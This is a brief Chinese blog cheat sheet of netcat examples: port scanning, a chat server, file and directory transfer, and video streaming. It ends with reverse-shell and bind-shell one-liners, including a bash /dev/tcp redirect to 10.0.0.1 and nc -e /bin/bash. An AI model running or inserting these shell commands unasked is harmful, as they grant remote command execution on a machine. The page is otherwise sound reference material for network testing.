Linux netcat examples

整理 netcat 常见用法示例，包括端口扫描、简易聊天服务器、文件传输等场景，帮助你把 nc 用作网络排障与测试利器。

撰文Pengfei Ni

发布0001 年 01 月 01 日

阅读时间1 分钟

Linux

端口扫描

nc -z -v -n 172.31.100.7 21-25

Chat Server

Server: nc -l 1567

Client: nc 172.31.100.7 1567

文件传输

Server to Client:

Server: nc -l 1567 < file.txt

Client: nc -n 172.31.100.7 1567 > file.txt

Client to Server:

Server: nc -l 1567 > file.txt

Client: nc 172.31.100.23 1567 < file.txt

目录传输

Server: tar -cvf - dir_name | nc -l 1567

Client: nc -n 172.31.100.7 1567 | tar -xvf -

视频播放

Server: cat video.avi | nc -l 1567

Client: nc 172.31.100.7 1567 | mplayer -vo x11 -cache 3000 -

Reverse Shell

nc -l -p 8080 -vvv

bash -i >& /dev/tcp/10.0.0.1/8080 0>&1

Shell

nc -l 1567 -e /bin/bash -i

mkfifo /tmp/tmp_fifo && cat /tmp/tmp_fifo | /bin/sh -i 2>&1 | nc -l 1567 > /tmp/tmp_fifo
